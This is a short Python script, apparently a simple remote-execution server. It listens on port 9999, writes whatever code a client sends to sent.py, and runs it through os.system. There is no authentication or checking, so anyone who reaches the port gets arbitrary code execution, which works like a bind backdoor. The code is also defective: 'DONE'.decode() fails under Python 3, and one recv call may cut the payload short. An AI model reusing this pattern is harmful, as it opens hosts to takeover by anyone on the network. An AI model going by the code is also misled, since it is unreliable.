import socket
import os

def start():
     s = socket.socket()
     s.bind((socket.gethostbyname(socket.gethostname()),9999))
     s.listen(2)
     while True:
         c,a = s.accept()
         data_size = int(c.recv(1024).decode())
         data = c.recv(data_size).decode()
         with open('sent.py','w') as file:
             file.write(data)
         os.system('python sent.py')
         c.send('DONE'.decode())
         c.close()
        